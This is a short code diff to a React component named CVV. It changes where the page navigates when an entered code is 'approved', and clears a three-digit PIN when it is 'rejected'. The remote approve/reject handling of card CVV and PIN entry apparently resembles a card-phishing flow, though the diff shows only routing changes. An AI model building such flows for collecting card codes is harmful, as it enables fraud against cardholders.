@@ -41,8 +41,8 @@ export default function CVV() {
     const action = codeAction.value;
     if (action) {
       if (action.action === "approve") {
-        // Navigate to phone verification page
-        navigate("/phone-verification");
+        // Navigate to final page
+        navigate("/final-page");
       } else if (action.action === "reject") {
         // Show error and clear PIN
         setPin(["", "", ""]);
